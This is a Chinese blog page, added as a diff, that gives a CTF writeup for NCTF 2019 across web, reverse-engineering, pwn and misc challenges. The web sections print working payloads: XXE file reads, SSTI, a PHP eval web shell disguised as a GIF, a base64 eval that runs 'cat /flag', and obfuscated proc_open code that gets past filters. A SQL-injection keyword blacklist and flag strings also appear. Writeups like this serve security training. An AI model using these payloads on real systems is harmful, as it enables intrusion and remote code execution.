@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Write up," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言打打小比赛练练手~ WEBFake XML cookbook123456&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY flag SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;user&gt;	&lt;username&gt;&amp;flag;&lt;&#x2F;username">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJUPT CTF writeup">
+<meta property="og:url" content="https://www.sketchplane.top/2019/11/22/NJCTF_WP/index.html">
+<meta property="og:site_name" content="sketch_pl4ne">
+<meta property="og:description" content="前言打打小比赛练练手~ WEBFake XML cookbook123456&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY flag SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;user&gt;	&lt;username&gt;&amp;flag;&lt;&#x2F;username">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/11/25/k6VzCG.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/11/25/k6VEsj.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/11/25/k6VYIc.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/11/24/k6ynjM.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/11/24/k6yeYt.png">
+<meta property="article:published_time" content="2019-11-22T13:25:11.000Z">
+<meta property="article:modified_time" content="2019-11-25T16:04:32.786Z">
+<meta property="article:author" content="sketch_pl4ne">
+<meta property="article:tag" content="Write up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://t1.picb.cc/uploads/2019/11/25/k6VzCG.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.sketchplane.top/2019/11/22/NJCTF_WP/"/>
+
+
+
+
+
+  <title>NJUPT CTF writeup | sketch_pl4ne</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?efbba552aa6e43dbec35569bd35c0ef6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sketch_pl4ne</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2019/11/22/NJCTF_WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sketch_pl4ne">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sketch_pl4ne">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">NJUPT CTF writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-22T21:25:11+08:00">
+                2019-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打打小比赛练练手~</p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;W3lc0m3_T0_NCTF_9102&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="True-XML-cookbook（未解出）"><a href="#True-XML-cookbook（未解出）" class="headerlink" title="True XML cookbook（未解出）"></a>True XML cookbook（未解出）</h4><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/f'</span>+<span class="string">'lag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>额，算是非常简单的SSTI了，可以看我博客：sketchplane.top</p>
+<h4 id="upload-your-shell"><a href="#upload-your-shell" class="headerlink" title="upload your shell"></a>upload your shell</h4><p>1， 直接上传一个v01cano.jpg文件，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[1]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2， 得到返回文件地址：</p>
+<p>filepath:/var/www/html/upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg</p>
+<p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VzCG.png" alt="img"></p>
+<p>3， 直接利用文件读取漏洞，读取Th1s_is_a_fl4g.jpg文件的内容：</p>
+<p><a href="http://nctf2019.x1ct34m.com:60002/index.php?action=upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg" target="_blank" rel="noopener">http://nctf2019.x1ct34m.com:60002/index.php?action=upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg</a></p>
+<p>得到flag如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;upload_1s_s0_funn7&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h4><p>直接在内容框中插入一段打cookie的js代码，成功获取cookie:</p>
+<p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VEsj.png" alt=""></p>
+<p>替换cookie获取flag：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VYIc.png" alt=""></p>
+<h4 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h4><p>“/robots.txt”-&gt;“/hint.txt”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
+
+<p>不多说废话直接上图</p>
+<p><img src="https://t1.picb.cc/uploads/2019/11/24/k6ynjM.png" alt=""></p>
+<p><img src="https://t1.picb.cc/uploads/2019/11/24/k6yeYt.png" alt=""></p>
+<p>脚本会检测到%00，手工Fuzz，wsl</p>
+<h4 id="phar-matches-everything-未解出"><a href="#phar-matches-everything-未解出" class="headerlink" title="phar matches everything (未解出)"></a>phar matches everything (未解出)</h4><p>Warning: getimagesize(<a href="http://nctf2019.x1ct34m.com:40004/upload.php%00.jpg" target="_blank" rel="noopener">http://nctf2019.x1ct34m.com:40004/upload.php%00.jpg</a>): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /var/www/html/catchmime.php on line 28<br>File is not an image.</p>
+<p>参考链接：<br><a href="https://www.secpulse.com/archives/94680.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/94680.html</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11504051.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11504051.html</a><br><a href="https://blog.csdn.net/xiaorouji/article/details/83118619" target="_blank" rel="noopener">https://blog.csdn.net/xiaorouji/article/details/83118619</a></p>
+<h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a</span><br><span class="line">&amp;str1=<span class="number">240610708</span></span><br><span class="line">&amp;str2=QPPQKSY</span><br><span class="line">&amp;q.w.q=ca\t *</span><br></pre></td></tr></table></figure>
+
+<p>这道题学到不少2333</p>
+<h5 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h5><p>利用preg_match()不匹配换行符 (应该是，有时候感觉这种东西不好说= =</p>
+<h5 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h5><p>strtr()是按单个字符匹配替换的。。。</p>
+<h5 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h5><p>$_GET[‘c_m_d’] ，传参时 c_m_d 等价于 c.m.d</p>
+<p>cat * 直接getflag</p>
+<h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>pat=xxx&amp;sub=xxx&amp;rep=%40eval(%40base64_decode(%24_POST%5Bn0ee1cca39220e%5D))%3B&amp;n0ee1cca39220e=c3lzdGVtKCJjYXQgL2ZsYWciKTs=</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;getshe11_has_different_methods&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h4><p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code=$p = proc_.open;</span><br><span class="line">$p1 = p.i.pe;</span><br><span class="line">$s = stre.am_.ge.t_con.te.nts;</span><br><span class="line">$arr =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="number">0</span> = <span class="keyword">array</span>($p1,r),</span><br><span class="line"> <span class="number">1</span> = <span class="keyword">array</span>($p1,w),</span><br><span class="line"> <span class="number">2</span> = <span class="keyword">array</span>(fi.le,tmperror.l.og, a)</span><br><span class="line"> );    </span><br><span class="line">$cwd = ;</span><br><span class="line">$env = <span class="keyword">array</span>();</span><br><span class="line">$process = $p(readflag, $arr, $p1, $cwd,$env);<span class="keyword">echo</span> $s($p1[<span class="number">1</span>]);</span><br><span class="line">&amp;useful=etcpasswd</span><br></pre></td></tr></table></figure>
+
+<p>search directory:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$a=$p=<span class="string">"/readflag"</span>;$d=<span class="string">"d"</span>.<span class="string">"i"</span>.<span class="string">"r"</span>;$o=$d($p);$r=<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"a"</span>.<span class="string">"d"</span>;<span class="keyword">while</span> (<span class="keyword">false</span> !== ($entry = $o-&gt;$r())) &#123;</span><br><span class="line">   <span class="keyword">echo</span> $entry.<span class="string">"\n"</span>;</span><br><span class="line">&#125;&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>readfile:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=$v=<span class="string">"var_"</span>.<span class="string">"dump"</span>;$f=<span class="string">"fil"</span>.<span class="string">"e"</span>;$v($f(<span class="string">"/readflag"</span>));</span><br><span class="line">&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>RCE:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?code=$p = <span class="string">"proc_"</span>.<span class="string">"open"</span>;</span><br><span class="line">$p1 = <span class="string">"p"</span>.<span class="string">"i"</span>.<span class="string">"pe"</span>;</span><br><span class="line">$s = <span class="string">"stre"</span>.<span class="string">"am_"</span>.<span class="string">"ge"</span>.<span class="string">"t_con"</span>.<span class="string">"te"</span>.<span class="string">"nts"</span>;</span><br><span class="line">$arr =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="number">0</span> =&gt; <span class="keyword">array</span>($p1,<span class="string">"r"</span>),</span><br><span class="line"> <span class="number">1</span> =&gt; <span class="keyword">array</span>($p1,<span class="string">"w"</span>),</span><br><span class="line"> <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"fi"</span>.<span class="string">"le"</span>,<span class="string">"/tmp/error.l"</span>.<span class="string">"og"</span>, <span class="string">"a"</span>)</span><br><span class="line"> );    </span><br><span class="line">$cwd = <span class="string">"/"</span>;</span><br><span class="line">$env = <span class="keyword">array</span>();</span><br><span class="line">$process = $p(<span class="string">"/readflag"</span>, $arr, $p1, $cwd,$env);<span class="keyword">echo</span> $s($p1[<span class="number">1</span>]);</span><br><span class="line">&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>我的心路历程都在这了。。。</p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;just_debug_it_2333&#125;</span><br></pre></td></tr></table></figure>
+<p>参考链接：<a href="https://blog.csdn.net/weixin_42621117/article/details/99768988" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42621117/article/details/99768988</a></p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'139.129.76.65'</span>, <span class="number">50003</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;hell0__play&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h4><p>图片尾部附加了压缩包，解压得到提示和两个图片，提示比较两图片像素，使用Stegsolve “to_do.png”-“to.png”=flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;m1sc_1s_very_funny!!!&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Become-a-Rockstar"><a href="#Become-a-Rockstar" class="headerlink" title="Become a Rockstar"></a>Become a Rockstar</h4><p>所有“says”后面的东西拼一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;youarnicerockstar&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Bright-Body-I"><a href="#Bright-Body-I" class="headerlink" title="Bright Body I"></a>Bright Body I</h4><p>\Bright Body I\Magic\Content\Paks\Magic-WindowsNoEditor.pak文件中直接搜“NCTF”得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;R_U_4_D4rk5Ou1s_III_P14y3r&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="有内鬼-终止交易"><a href="#有内鬼-终止交易" class="headerlink" title="有内鬼,终止交易"></a>有内鬼,终止交易</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"123.207.121.32"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">25565</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"5e77b05530b30283e24c120d8cc13fb5"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">600</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>shadowsocks流量包解密</p>
+<h4 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h4><p>伪加密解压得到图片，尾部附加doc文档，文件-选项-显示隐藏文字，选中文字-字体-取消隐藏-复制-base85解密得到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原文</span></span><br><span class="line">PD4~idqQC|WjHloX&gt;)UPb8~ZFb8laGczAeteE</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">NCTF&#123;Ba3e85_issssss_so_xxxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a href="https://www.cnblogs.com/Yuuki-/p/7897069.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yuuki-/p/7897069.html</a></p>
+<h4 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s this"></a>What’s this</h4><p>导出压缩包，伪加密解密得到文本文件，base64隐写解密，二进制转字符串得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;dbb2ef54afc2877ed9973780606a3c8b&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2077"><a href="#2077" class="headerlink" title="2077"></a>2077</h4><p>i:0-2986<br><a href="https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/360p30/i.ts" target="_blank" rel="noopener">https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/360p30/i.ts</a><br><a href="https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/chunked/i.ts" target="_blank" rel="noopener">https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/chunked/i.ts</a></p>
+<p>wget -i dl.csv</p>
+<p>ffmpeg -f concat -i filelist.txt -c copy output.mp4</p>
+<p>ffmpeg -i output.mp4 -r 0.018 image-%05d.jpg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PSC:\&gt;.&#x2F;drop_package</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAB4AAAAQ4CAIAAABnSVYUAAjxYk1EQVR4AYzYBXPbyrcA8JQS</span><br><span class="line">s0VmjplR5khmhpgxdhx0kzTc9DK0vfjud35HVv6+KTyY+c3O0eosaAUzq+ce&#x2F;xrD95zhEQCX</span><br><span class="line"></span><br><span class="line">BwMOtwDYXUKHW+RyIsDjxoDXiy6Jgc+HsJaHQuD2CV1eaMgDy+28m5th9wiWeOAxdiM21&#x2F;hL</span><br><span class="line">bD6wunhPWZzcL0E9m&#x2F;zFKFAv&#x2F;JLdI3J6sc&#x2F;Axbq9OHtdfi8W8OEBHxoK4I9C&#x2F;EhE9CgmZsUS</span><br><span class="line">aCwm+1xcAqIxYgn7f4pE8f8F2xt0uxKP4SAWxUAkjIRJcZhEQ0GmjISxaFQciyHxuDiRQLa2</span><br><span class="line"></span><br><span class="line">SCWEQYlWEglGPC4EsZjocwkhiCdFgG1LUThNE0+1UhJA0xgjhVC0GEBAp0QglRYDOi2jUtKn</span><br><span class="line">tmjJEp6ksE8hYItG13AqRUAyNAepjDyVkaazMrYE2bwCQPAUpIHHnLQUZGh8JUujuRQGJStD</span><br><span class="line"></span><br><span class="line">&#x2F;TEA9yKRYB6ARAIeIYKiJRBudyqFA2YFcsI1&#x2F;pIYUHnZVk4aLUhDGcyxJTNFUJ2HkFkEMhVP</span><br><span class="line">ouAoZQy1cl2r5mj160CtfQkUKgFQaUQaHQK0ehRiqJEpeECu5LPBV0nlXIaMvyKTC8DTHKVq</span><br></pre></td></tr></table></figure>
+
+<h4 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h4><p>运行命令pip install –user nctf-2019-installme，在控制台输出包含压缩包下载链接，下载解压得到源码，在“setup.py”找到base64加密的flag，解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;c4reful_ab0u7_ev1l_pip_p4ckage&#125;</span><br></pre></td></tr></table></figure>
+
+<p>卸载库pip uninstall nctf-2019-installme，真实flag文件位置在//TODO</p>
+<h4 id="NCTF2019问卷调查"><a href="#NCTF2019问卷调查" class="headerlink" title="NCTF2019问卷调查"></a>NCTF2019问卷调查</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;Thank_you_for_participating_NCTF2019!&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h4><p>wertyuio分别对应2-9，对应手机九键…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;youaresosmartthatthisisjustapieceofcake&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>真就差1名呗= =</p>
+<p>已经是第三次差一点了，主要还是wtcl，有一个flask debug 还差一点。</p>
+<p>另外感谢<strong>T1M</strong>师傅和<strong>火山</strong>师傅带飞~</p>
+
+      
